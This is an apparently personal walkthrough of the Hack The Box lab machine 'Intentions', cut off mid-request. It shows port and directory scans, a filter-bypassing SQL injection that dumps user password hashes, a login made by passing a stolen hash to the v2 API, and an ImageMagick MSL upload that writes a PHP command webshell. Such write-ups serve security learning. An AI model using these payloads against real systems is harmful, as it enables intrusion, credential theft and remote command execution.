```
sudo nmap -sS -sV -sC -p- 10.10.11.220

Nmap scan report for 10.10.11.220
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 47:d2:00:66:27:5e:e6:9c:80:89:03:b5:8f:9e:60:e5 (ECDSA)
|_  256 c8:d0:ac:8d:29:9b:87:40:5f:1b:b0:a4:1d:53:8f:f1 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Intentions
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

welp not much ill go check out the website....
![[Pasted image 20250911203111.png]]

login page... before we get started lets run gobuster:
```
gobuster dir -u http://10.10.11.220/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -x php,html,txt       
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.220/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.git/config.html     (Status: 403) [Size: 162]
/.git.txt             (Status: 403) [Size: 162]
/.cvsignore.html      (Status: 403) [Size: 162]
/.cache.html          (Status: 403) [Size: 162]
/.cache.txt           (Status: 403) [Size: 162]
/.bashrc              (Status: 403) [Size: 162]
/.git-rewrite         (Status: 403) [Size: 162]
/.git/config          (Status: 403) [Size: 162]
/.git-rewrite.html    (Status: 403) [Size: 162]
/.git/config.txt      (Status: 403) [Size: 162]
/.config.html         (Status: 403) [Size: 162]
/.cvs.txt             (Status: 403) [Size: 162]
/.git.html            (Status: 403) [Size: 162]
/.cache               (Status: 403) [Size: 162]
...
/admin                (Status: 302) [Size: 322] [--> http://10.10.11.220]
/cgi-bin/.txt         (Status: 403) [Size: 162]
/cgi-bin/.html        (Status: 403) [Size: 162]
/css                  (Status: 301) [Size: 178] [--> http://10.10.11.220/css/]
/favicon.ico          (Status: 200) [Size: 0]
/fonts                (Status: 301) [Size: 178] [--> http://10.10.11.220/fonts/]
/gallery              (Status: 302) [Size: 322] [--> http://10.10.11.220]
/index.php            (Status: 200) [Size: 1523]
/index.php            (Status: 200) [Size: 1523]
/js                   (Status: 301) [Size: 178] [--> http://10.10.11.220/js/]
/logout               (Status: 302) [Size: 322] [--> http://10.10.11.220]
/node_modules/.package-lock.json (Status: 403) [Size: 162]
/node_modules/.package-lock.json.txt (Status: 403) [Size: 162]
/node_modules/.package-lock.json.html (Status: 403) [Size: 162]
/robots.txt           (Status: 200) [Size: 24]
/robots.txt           (Status: 200) [Size: 24]
/storage              (Status: 301) [Size: 178] [--> http://10.10.11.220/storage/]
```

ill look in storage and js dirs:
```
gobuster dir -u http://10.10.11.220/storage/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -x php,html,txt,js

...
/architecture         (Status: 301) [Size: 178] [--> http://10.10.11.220/storage/architecture/]
...
/food                 (Status: 301) [Size: 178] [--> http://10.10.11.220/storage/food/]
```

and 
```
gobuster dir -u http://10.10.11.220/js/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -x php,html,txt,js
...

/admin.js             (Status: 200) [Size: 311246]
/app.js               (Status: 200) [Size: 433792]
/gallery.js           (Status: 200) [Size: 310841]
/login.js             (Status: 200) [Size: 279176]
/mdb.js               (Status: 200) [Size: 153684]
```

mdb and admin js standout fs:

`curl http://10.10.11.220/js/admin.js `

returns a shit ton...

but at the bottom i see this:
```
                Recently we've had some copyrighted images slip through onto the gallery. \n                This could turn into a big issue for us so we are putting a new process in place that all new images must go through our legal council for approval.\n                Any new images you would like to add to the gallery should be provided to legal with all relevant copyright information.\n                I've assigned Greg to setup a process for legal to transfer approved images directly to the server to avoid any confusion or mishaps.\n                This will be the only way to add images to our gallery going forward.\n            ")])])]),t._v(" "),e("div",{staticClass:"card"},[e("div",{staticClass:"card-body"},[e("h5",{staticClass:"card-title"},[t._v("v2 API Update")]),t._v(" "),e("p",{staticClass:"card-text"},[t._v("\n                Hey team, I've deployed the v2 API to production and have started using it in the admin section. \n                Let me know if you spot any bugs. \n                This will be a major security upgrade for our users, passwords no longer need to be transmitted to the server in clear text! \n                By hashing the password client side there is no risk to our users as BCrypt is basically uncrackable.\n                This should take care of the concerns raised by our users regarding our lack of HTTPS connection.\n            ")]),t._v(" "),e("p",{staticClass:"card-text"},[t._v("\n                The v2 API also comes with some neat features we are testing that could allow users to apply cool effects to the images. I've included some examples on the image editing page, but feel free to browse all of the available effects for the module and suggest some: "
```

only reason was this was the only thing not squished together lol

`curl http://10.10.11.220/js/admin.js `
returns all junk, least i think it is all squished nothing stands out... hope i didnt miss something... moving on....

i went to every non-403 and they still were unauthed(403)... lets try registering a user...
im able to register a user:
`hacker:pwned123`

login works and brings me to a dashboard of some sort:
![[Pasted image 20250911204357.png]]
under your profile i see this field:
![[Pasted image 20250911204634.png]]

when i put in that ' it crashes my feed, i smell sqli.... i am gonna try to run UNION queries to see if we can get the columns and such and then from there try to find dbs and tables :D

so if i put in` food'` i check my feed page and there is nothing... to me that is a sign of a crash... i have a feeling that there is some sort of querying going on to` /storage/[category]` with that said the default had these comma separated, i will try `food,'1=2 -- -` still nothing...

i assume the backend query has some sort of filtering or cleaning process, maybe it passes these in to some sort of ().. i will try commenting out using #: ` food,')UNION SELECT 1,2,3,4,5#`
no luck, though i do notice when i look at feed and come back that all spaces are now gone, there may be something that gets rid of these spaces and with some googling i find and try `/**/`

final query: `food,')/**/UNION/**/SELECT/**/1,2,3,4,5#` and i look back at the feed and find this:
![[Pasted image 20250911212031.png]]

the page loaded food like it should and then at the bottom we see genre: 3 with placeholder image!

this worked!

lets capture this req in burpsuite and see if we can see any more data then what is shown...
Note: I have bloodhound already running as i love this tool... but i need to stop it as it is interfering with my burpsuite proxy...:
lets find where this is running:
```
ps aux | grep bloodhound

it is running fs

sudo pkill -f bloodhound
```

restart burpsuite... and works

ok back to what i was doing:
![[Pasted image 20250911213542.png]]

as you can see in burpsuite this is the req to: `/api/v1/gallery/user/feed` now it is easily tellable what is what:
- `food,')` → closes a quoted string and the closing `)` likely ends a list/context in the original query.
    
- `/**/` → SQL comment blocks to bypass simple WAF/filters and whitespace rules.
    
- `UNION SELECT 1,2,3,4,5` → injects a second result-set that must **match the original SELECT’s column count and compatible types**.
    
- `#` → comments out the rest of the server’s SQL (MySQL style), preventing syntax errors.

with that said now we see exactly how the UNION SELECT is mapped to help further enumerate:
 `1,2,3,4,5` got mapped into the API’s JSON fields:

- `id` → `1`
    
- `file` → `"2"` → app later builds `url` as `/storage/2` from that
    
- `genre` → `"3"` → shown on the page as “genre: 3”
    
- `created_at` → `4` rendered as **Unix epoch 4s** (`1970-01-01…:04Z`)
    
- `updated_at` → `5` rendered as **Unix epoch 5s**

COOL!
lets now try this:` ') UNION SELECT 1,@@version,user(),database(),5#` = `food,')/**/UNION/**/SELECT/**/1,@@version,user(),database(),5#`

returns:
```
{
    "message": "Server Error"
}
```

lets try:
`food,')/**/UNION/**/SELECT/**/1,2,user(),database(),5#`

SUCCESS!
returns:
```
{"status":"success","data":{"id":28,"name":"hacker","email":"hacker@gmail.com","created_at":"2025-09-12T00:42:51.000000Z","updated_at":"2025-09-12T01:45:31.000000Z","admin":0,"genres":"food,')\/**\/UNION\/**\/SELECT\/**\/1,@@version,user(),database(),5#"}}
```

i notice that admin field is set to 0... prob is like boolean 0 = false, 1= true

didnt get the database -> `food,')/**/UNION/**/SELECT/**/1,database(),3,4,5#`

returns:
```
{"id":1,"file":"intentions","genre":"3","created_at":"1970-01-01T00:00:04.000000Z","updated_at":"1970-01-01T00:00:05.000000Z","url":"\/storage\/intentions"}
```

database = intentions

ill do same for user()
```
{"id":1,"file":"laravel@localhost","genre":"3","created_at":"1970-01-01T00:00:04.000000Z","updated_at":"1970-01-01T00:00:05.000000Z","url":"\/storage\/intentions"}
```

user = laravel@localhost

ill do again same for version()
`10.6.12-MariaDB-0ubuntu0.22.04.1`

lets try to get list of tables:
`')/**/UNION/**/SELECT/**/1,table_schema,table_name,4,5/**/from/**/information_schema.tables/**/where/**/table_schema/**/!=/**/'information_schema'#`

```
{"status":"success","data":[{"id":1,"file":"intentions","genre":"gallery_images","created_at":"1970-01-01T00:00:04.000000Z","updated_at":"1970-01-01T00:00:05.000000Z","url":"\/storage\/intentions"},

{"id":1,"file":"intentions","genre":"personal_access_tokens","created_at":"1970-01-01T00:00:04.000000Z","updated_at":"1970-01-01T00:00:05.000000Z","url":"\/storage\/intentions"},

{"id":1,"file":"intentions","genre":"migrations","created_at":"1970-01-01T00:00:04.000000Z","updated_at":"1970-01-01T00:00:05.000000Z","url":"\/storage\/intentions"},

{"id":1,"file":"intentions","genre":"users","created_at":"1970-01-01T00:00:04.000000Z","updated_at":"1970-01-01T00:00:05.000000Z","url":"\/storage\/intentions"}]}
```

tables: `gallery_images, personal_access_tokens, migrations, users`

lets look in users see if we can get passwords:
```
')/**/UNION/**/SELECT/**/1,2,column_name,4,5/**/from/**/information_schema.columns/**/where/**/table_name='users'#
```

returns: `id`, `name`, `email`, `password`, `created_at`, `updated_at`, and `genres`

```
')/**/UNION/**/SELECT/**/1,2,concat(name,':',email,':',admin,':',password,':',genres),4,5/**/from/**/users#
```
```
{"status":"success","data":[{"id":1,"file":"2","genre":"steve:steve@intentions.htb:1:$2y$10$M\/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa:food,travel,nature","created_at":"1970-01-01T00:00:04.000000Z","updated_at":"1970-01-01T00:00:05.000000Z","url":"\/storage\/2"},{"id":1,"file":"2","genre":"greg:greg@intentions.htb:1:$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m:food,travel,nature","created_at":"1970-01-01T00:00:04.000000Z","updated_at":"1970-01-01T00:00:05.000000Z","url":"\/storage\/2"},{"id":1,"file":"2","genre":"Melisa Runolfsson:hettie.rutherford@example.org:0:$2y$10$bymjBxAEluQZEc1O7r1h3OdmlHJpTFJ6CqL1x2ZfQ3paSf509bUJ6:food,travel,nature","created_at":"1970-01-01T00:00:04.000000Z","updated_at":"1970-01-01T00:00:05.000000Z","url":"\/storage\/2"},{"id":1,"file":"2","genre":"Camren Ullrich:nader.alva@example.org:0:$2y$10$WkBf7NFjzE5GI5SP7hB5\/uA9Bi\/BmoNFIUfhBye4gUql\/JIc\/GTE2:food,travel,nature","created_at":"1970-01-01T00:00:04.000000Z","updated_at":"1970-01-01T00:00:05.000000Z","url":"\/storage\/2"},{"id":1,"file":"2","genre":"Mr. Lucius Towne I:jones.laury@example.com:0:$2y$10$JembrsnTWIgDZH3vFo1qT.Zf\/hbphiPj1vGdVMXCk56icvD6mn\/ae:food,travel,nature","created_at":"1970-01-01T00:00:04.000000Z","updated_at":"1970-01-01T00:00:05.000000Z","url":"\/storage\/2"},{"id":1,"file":"2","genre":"Jasen Mosciski:wanda93@example.org:0:$2y$10$oKGH6f8KdEblk6hzkqa2meqyDeiy5gOSSfMeygzoFJ9d1eqgiD2rW:food,travel,nature","created_at":"1970-01-01T00:00:04.000000Z","updated_at":"1970-01-01T00:00:05.000000Z","url":"\/storage\/2"},{"id":1,"file":"2","genre":"Monique D'Amore:mwisoky@example.org:0:$2y$10$pAMvp3xPODhnm38lnbwPYuZN0B\/0nnHyTSMf1pbEoz6Ghjq.ecA7.:food,travel,nature","created_at":"1970-01-01T00:00:04.000000Z","updated_at":"1970-01-01T00:00:05.000000Z","url":"\/storage\/2"},{"id":1,"file":"2","genre":"Desmond Greenfelder:lura.zieme@example.org:0:$2y$10$.VfxnlYhad5YPvanmSt3L.5tGaTa4\/dXv1jnfBVCpaR2h.SDDioy2:food,travel,nature","created_at":"1970-01-01T00:00:04.000000Z","updated_at":"1970-01-01T00:00:05.000000Z","url":"\/storage\/2"},{"id":1,"file":"2","genre":"Mrs. Roxanne Raynor:pouros.marcus@example.net:0:$2y$10$UD1HYmPNuqsWXwhyXSW2d.CawOv1C8QZknUBRgg3\/Kx82hjqbJFMO:food,travel,nature","created_at":"1970-01-01T00:00:04.000000Z","updated_at":"1970-01-01T00:00:05.000000Z","url":"\/storage\/2"},{"id":1,"file":"2","genre":"Rose Rutherford:mellie.okon@example.com:0:$2y$10$4nxh9pJV0HmqEdq9sKRjKuHshmloVH1eH0mSBMzfzx\/kpO\/XcKw1m:food,travel,nature","created_at":"1970-01-01T00:00:04.000000Z","updated_at":"1970-01-01T00:00:05.000000Z","url":"\/storage\/2"},{"id":1,"file":"2","genre":"Dr. Chelsie Greenholt 
...
massive list i am not gonna put it all here..
```
organized
```
steve:steve@intentions.htb:1:$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa:food,travel,nature
greg:greg@intentions.htb:1:$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m:food,travel,nature
Melisa Runolfsson:hettie.rutherford@example.org:0:$2y$10$bymjBxAEluQZEc1O7r1h3OdmlHJpTFJ6CqL1x2ZfQ3paSf509bUJ6:food,travel,nature
Camren Ullrich:nader.alva@example.org:0:$2y$10$WkBf7NFjzE5GI5SP7hB5/uA9Bi/BmoNFIUfhBye4gUql/JIc/GTE2:food,travel,nature
Mr. Lucius Towne I:jones.laury@example.com:0:$2y$10$JembrsnTWIgDZH3vFo1qT.Zf/hbphiPj1vGdVMXCk56icvD6mn/ae:food,travel,nature
Jasen Mosciski:wanda93@example.org:0:$2y$10$oKGH6f8KdEblk6hzkqa2meqyDeiy5gOSSfMeygzoFJ9d1eqgiD2rW:food,travel,nature
Monique D'Amore:mwisoky@example.org:0:$2y$10$pAMvp3xPODhnm38lnbwPYuZN0B/0nnHyTSMf1pbEoz6Ghjq.ecA7.:food,travel,nature
Desmond Greenfelder:lura.zieme@example.org:0:$2y$10$.VfxnlYhad5YPvanmSt3L.5tGaTa4/dXv1jnfBVCpaR2h.SDDioy2:food,travel,nature
Mrs. Roxanne Raynor:pouros.marcus@example.net:0:$2y$10$UD1HYmPNuqsWXwhyXSW2d.CawOv1C8QZknUBRgg3/Kx82hjqbJFMO:food,travel,nature
Rose Rutherford:mellie.okon@example.com:0:$2y$10$4nxh9pJV0HmqEdq9sKRjKuHshmloVH1eH0mSBMzfzx/kpO/XcKw1m:food,travel,nature
Dr. Chelsie Greenholt I:trace94@example.net:0:$2y$10$by.sn.tdh2V1swiDijAZpe1bUpfQr6ZjNUIkug8LSdR2ZVdS9bR7W:food,travel,nature
Prof. Johanna Ullrich MD:kayleigh18@example.com:0:$2y$10$9Yf1zb0jwxqeSnzS9CymsevVGLWIDYI4fQRF5704bMN8Vd4vkvvHi:food,travel,nature
Prof. Gina Brekke:tdach@example.com:0:$2y$10$UnvH8xiHiZa.wryeO1O5IuARzkwbFogWqE7x74O1we9HYspsv9b2.:food,travel,nature
Jarrett Bayer:lindsey.muller@example.org:0:$2y$10$yUpaabSbUpbfNIDzvXUrn.1O8I6LbxuK63GqzrWOyEt8DRd0ljyKS:food,travel,nature
Macy Walter:tschmidt@example.org:0:$2y$10$01SOJhuW9WzULsWQHspsde3vVKt6VwNADSWY45Ji33lKn7sSvIxIm:food,travel,nature
Prof. Devan Ortiz DDS:murray.marilie@example.com:0:$2y$10$I7I4W5pfcLwu3O/wJwAeJ.xqukO924Tx6WHz1am.PtEXFiFhZUd9S:food,travel,nature
Eula Shields:barbara.goodwin@example.com:0:$2y$10$0fkHzVJ7paAx0rYErFAtA.2MpKY/ny1.kp/qFzU22t0aBNJHEMkg2:food,travel,nature
Mariano Corwin:maggio.lonny@example.org:0:$2y$10$p.QL52DVRRHvSM121QCIFOJnAHuVPG5gJDB/N2/lf76YTn1FQGiya:food,travel,nature
Madisyn Reinger DDS:chackett@example.org:0:$2y$10$GDyg.hs4VqBhGlCBFb5dDO6Y0bwb87CPmgFLubYEdHLDXZVyn3lUW:food,travel,nature
Jayson Strosin:layla.swift@example.net:0:$2y$10$Gy9v3MDkk5cWO40.H6sJ5uwYJCAlzxf/OhpXbkklsHoLdA8aVt3Ei:food,travel,nature
Zelda Jenkins:rshanahan@example.net:0:$2y$10$/2wLaoWygrWELes242Cq6Ol3UUx5MmZ31Eqq91Kgm2O8S.39cv9L2:food,travel,nature
Eugene Okuneva I:shyatt@example.com:0:$2y$10$k/yUU3iPYEvQRBetaF6GpuxAwapReAPUU8Kd1C0Iygu.JQ/Cllvgy:food,travel,nature
Mrs. Rhianna Hahn DDS:sierra.russel@example.com:0:$2y$10$0aYgz4DMuXe1gm5/aT.gTe0kgiEKO1xf/7ank4EW1s6ISt1Khs8Ma:food,travel,nature
Viola Vandervort DVM:ferry.erling@example.com:0:$2y$10$iGDL/XqpsqG.uu875Sp2XOaczC6A3GfO5eOz1kL1k5GMVZMipZPpa:food,travel,nature
Prof. Margret Von Jr.:beryl68@example.org:0:$2y$10$stXFuM4ct/eKhUfu09JCVOXCTOQLhDQ4CFjlIstypyRUGazqmNpCa:food,travel,nature
Florence Crona:ellie.moore@example.net:0:$2y$10$NDW.r.M5zfl8yDT6rJTcjemJb0YzrJ6gl6tN.iohUugld3EZQZkQy:food,travel,nature
Tod Casper:littel.blair@example.org:0:$2y$10$S5pjACbhVo9SGO4Be8hQY.Rn87sg10BTQErH3tChanxipQOe9l7Ou:food,travel,nature
hacker:hacker@gmail.com:0:$2y$10$zGa8nCu33gt1USaLC343OOFt5XfqZOzIWg253BPDI5kIc1gBChpre:')\/**\/UNION\/**\/SELECT\/**\/1,2,concat(name,':',email,':',admin,':',password,':',genres),4,5\/**\/from\/**\/users#
```
cool

notice from before that admin field was set to 0 for me(hacker)
```
steve:steve@intentions.htb:1:$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa:food,travel,nature

greg:greg@intentions.htb:1:$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m:food,travel,nature
```
greg and steve have it set to 1... lets crack these passwords and try to login as them see if dashboard is different...

from message above we know these hashes are prob bcrypt:
hashes.txt:
```
$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa
$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m
```

hashcat:
```
hashcat -m 3200 hashes.txt  /usr/share/wordlists/rockyou.txt --force
```
i let it run for over 20 min nothing......

looking back at the message we found and my burpsuite i notice requests going to /api/v1/...
lets try api/v2/.. like it says in message -  we can pass hash

```
POST /api/v1/auth/login HTTP/1.1
Host: 10.10.11.220
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: application/json
X-XSRF-TOKEN: eyJpdiI6Ijg4TTAvWTZPSUxCRTQ4aFR3emxqUFE9PSIsInZhbHVlIjoiVHNBRlpsZ1cxLzF0MmxEL01kMCtvNkpyckJPUldtVFJCL0xJbEpTLzFPK1JqWWlueTUwQlpyaWlkTXBWQitFZHhFRlRieG9FeFJkSnpWSWVINzVwTnVNMTNxa0l4QmlqdCtDZm9PZzZiV2RNRVd4ZFRJRnUzUWhmc2hJU3BmY3kiLCJtYWMiOiIwMTM5NzI0M2Q4Mjg1ZWY3N2RjMzljNjBjZmE0MzZjZGVlMTkzNGNkZDQxOTFkNTk3MmU4NThlMjBjMzIzNjk3IiwidGFnIjoiIn0=
Content-Length: 50
Origin: http://10.10.11.220
Connection: keep-alive
Referer: http://10.10.11.220/index.php
Cookie: XSRF-TOKEN=eyJpdiI6Ijg4TTAvWTZPSUxCRTQ4aFR3emxqUFE9PSIsInZhbHVlIjoiVHNBRlpsZ1cxLzF0MmxEL01kMCtvNkpyckJPUldtVFJCL0xJbEpTLzFPK1JqWWlueTUwQlpyaWlkTXBWQitFZHhFRlRieG9FeFJkSnpWSWVINzVwTnVNMTNxa0l4QmlqdCtDZm9PZzZiV2RNRVd4ZFRJRnUzUWhmc2hJU3BmY3kiLCJtYWMiOiIwMTM5NzI0M2Q4Mjg1ZWY3N2RjMzljNjBjZmE0MzZjZGVlMTkzNGNkZDQxOTFkNTk3MmU4NThlMjBjMzIzNjk3IiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6ImtjNys0a05LVlFZU1UzYmsxNGJGL3c9PSIsInZhbHVlIjoiZ3pQMlc5Si9JMHozR2NOKy9wTGh2QmZJWEc0UzNMZXNhZ01TQWp3eDcrL2lwYmF0eXpqZzZ2Ui92S0N3WnN3a2RhZ3E3bDRxUVZ6d2ZacCtSMjZVQzR6WG12Szl1bDVlTXBxK0hVVWhSaU95QnhWMWc2WFNaTmxBUEJyRlZwZ0wiLCJtYWMiOiI2YTQ2NzFhOTFhY2Y0MzUxYmE3ZDk2YjUzMDc1NDZlZWEyMjM2MzJlNzUwYTQ0NDcxOGY5ZjVkZjgxODdjODZkIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92MS9hdXRoL2xvZ2luIiwiaWF0IjoxNzU3NjM3Nzg3LCJleHAiOjE3NTc2NTkzODcsIm5iZiI6MTc1NzYzNzc4NywianRpIjoiTnE0blRRQXlmOEt5R2hjWSIsInN1YiI6IjI4IiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.aZCBHqP38rxU_Xxzfb-UPHt6ptiSMCPHUq5MkSZZoxw
Priority: u=0

{"email":"hacker@gmail.com","password":"pwned123"}
```

lets try after send req to repeater and changing the v1 to v2:
```
{"email":"steve@intentions.htb","hash":"$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa"}
```
RES:
```
{"status":"success","name":"steve"}
```

nice!

im now logged in as steve... note you will want to intercept this req with burpsuite and modify req like above...
![[Pasted image 20250911224007.png]]

lets go to that /admin and see if it loads now...
![[Pasted image 20250911224040.png]]

yuppp

can modify images... 
![[Pasted image 20250911224142.png]]

actually kinda chill...

i check burpsuite and here is the req:
```
POST /api/v2/admin/image/modify HTTP/1.1
Host: 10.10.11.220
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: application/json
X-XSRF-TOKEN: eyJpdiI6IlhOdnEyeFBCdmNQN1N5cjNKeCtsL3c9PSIsInZhbHVlIjoiZXU4Zmx3QUQ5bVFXYUNtcWVyVHhWalJrZWNTbjNLcnpwbS9FcE14em10ejc5MkpaYWdDdVhJbE92OUJodGc3WTRIYkNhN1grTjNNT3Nzd2MyMTYwcHBRcGliS1dScWVjSkFZZVBpVmJsb3ZWcm9ybU8xVGk2Mko5Tjh0TEJjejEiLCJtYWMiOiJhODAyZjA4NDgzOTdlMWQxZTllMGY0MDUwNjU0M2QyNjRhNTQ0NjhkYjEyMWFmYWY4YzVhYWIxMmRjOWU1MzYxIiwidGFnIjoiIn0=
Content-Length: 113
Origin: http://10.10.11.220
Connection: keep-alive
Referer: http://10.10.11.220/admin
Cookie: XSRF-TOKEN=eyJpdiI6IlhOdnEyeFBCdmNQN1N5cjNKeCtsL3c9PSIsInZhbHVlIjoiZXU4Zmx3QUQ5bVFXYUNtcWVyVHhWalJrZWNTbjNLcnpwbS9FcE14em10ejc5MkpaYWdDdVhJbE92OUJodGc3WTRIYkNhN1grTjNNT3Nzd2MyMTYwcHBRcGliS1dScWVjSkFZZVBpVmJsb3ZWcm9ybU8xVGk2Mko5Tjh0TEJjejEiLCJtYWMiOiJhODAyZjA4NDgzOTdlMWQxZTllMGY0MDUwNjU0M2QyNjRhNTQ0NjhkYjEyMWFmYWY4YzVhYWIxMmRjOWU1MzYxIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IlJLWHp5cGNMZ2I0VWlDZHhmQlR6aXc9PSIsInZhbHVlIjoibGdob2pvdG41SkhxTndLdkdhZGVFTTYrRzdSNVhRT3pZTHRoOEF5UmNoU1l0ZG9UKzFOWjBhVk54bENwSGE4ZG0vek5PVkc2VUZ0NVJPZWtUcUtpSnVGeGQ4RXZmRkJqZ1FRNktyV1hFeFRpTnFUVUM1d0lIVGlWM2E4YjlDQ0wiLCJtYWMiOiJhZGU0YTgzZDdkNTg1NDE0Y2Q5ODk0ZTM0YWI4MTY4NGU1ZmM2NDcyZTMzYzVkZWVhYzcyMDdmNGZkOWU5ZGFmIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92Mi9hdXRoL2xvZ2luIiwiaWF0IjoxNzU3NjQ0NzgyLCJleHAiOjE3NTc2NjYzODIsIm5iZiI6MTc1NzY0NDc4MiwianRpIjoiaXE2TDFFM1VLYWRSZ2hIUiIsInN1YiI6IjEiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.UtM0OuBZAUue_rg5W-78B_bdKIXJOUt5rrHZGb8J6ys
Priority: u=0

{"path":"/var/www/html/intentions/storage/app/public/animals/ashlee-w-wv36v9TGNBw-unsplash.jpg","effect":"swirl"}
```

i have a feeling we can upload a payload somehow here...


i googled and tried a lot of things none worked even if we put python server and php webshell/revshell it is not working... but my python server does get hit.... i looked at writeup for this:
https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/

```php
# Vulnerable code
$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```

we need to POST req here 
`POST /api/v2/admin/image/modify?path=vid:msl:/tmp/php*&effect=abcd HTTP/1.1`

then where the body goes use this:
```
--------------------------abcd
Content-Disposition: form-data; name="file"; filename="test.msl"
Content-Type: application/octet-stream

<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:&lt;?php system($_REQUEST['cmd']); ?&gt;" />
<write filename="info:/var/www/html/intentions/storage/app/public/rev.php" />
</image>
--------------------------abcd
```

full req that worked... :
```
POST /api/v2/admin/image/modify?path=vid:msl:/tmp/php*&effect=abcd HTTP/1.1
Host: 10.10.11.220
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept-Encoding: gzip, deflate, br
X-XSRF-TOKEN: eyJpdiI6IlhOdnEyeFBCdmNQN1N5cjNKeCtsL3c9PSIsInZhbHVlIjoiZXU4Zmx3QUQ5bVFXYUNtcWVyVHhWalJrZWNTbjNLcnpwbS9FcE14em10ejc5MkpaYWdDdVhJbE92OUJodGc3WTRIYkNhN1grTjNNT3Nzd2MyMTYwcHBRcGliS1dScWVjSkFZZVBpVmJsb3ZWcm9ybU8xVGk2Mko5Tjh0TEJjejEiLCJtYWMiOiJhODAyZjA4NDgzOTdlMWQxZTllMGY0MDUwNjU0M2QyNjRhNTQ0NjhkYjEyMWFmYWY4YzVhYWIxMmRjOWU1MzYxIiwidGFnIjoiIn0=
Content-Length: 378
Content-Type: multipart/form-data; boundary=------------------------abcd
Origin: http://10.10.11.220
Connection: keep-alive
Referer: http://10.10.11.220/admin
Cookie: XSRF-TOKEN=eyJpdiI6IlhOdnEyeFBCdmNQN1N5cjNKeCtsL3c9PSIsInZhbHVlIjoiZXU4Zmx3QUQ5bVFXYUNtcWVyVHhWalJrZWNTbjNLcnpwbS9FcE14em10ejc5MkpaYWdDdVhJbE92OUJodGc3WTRIYkNhN1grTjNNT3Nzd2MyMTYwcHBRcGliS1dScWVjSkFZZVBpVmJsb3ZWcm9ybU8xVGk2Mko5Tjh0TEJjejEiLCJtYWMiOiJhODAyZjA4NDgzOTdlMWQxZTllMGY0MDUwNjU0M2QyNjRhNTQ0NjhkYjEyMWFmYWY4YzVhYWIxMmRjOWU1MzYxIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IlJLWHp5cGNMZ2I0VWlDZHhmQlR6aXc9PSIsInZhbHVlIjoibGdob2pvdG41SkhxTndLdkdhZGVFTTYrRzdSNVhRT3pZTHRoOEF5UmNoU1l0ZG9UKzFOWjBhVk54bENwSGE4ZG0vek5PVkc2VUZ0NVJPZWtUcUtpSnVGeGQ4RXZmRkJqZ1FRNktyV1hFeFRpTnFUVUM1d0lIVGlWM2E4YjlDQ0wiLCJtYWMiOiJhZGU0YTgzZDdkNTg1NDE0Y2Q5ODk0ZTM0YWI4MTY4NGU1ZmM2NDcyZTMzYzVkZWVhYzcyMDdmNGZkOWU5ZGFmIiwidGFnIjoiIn0%3D; 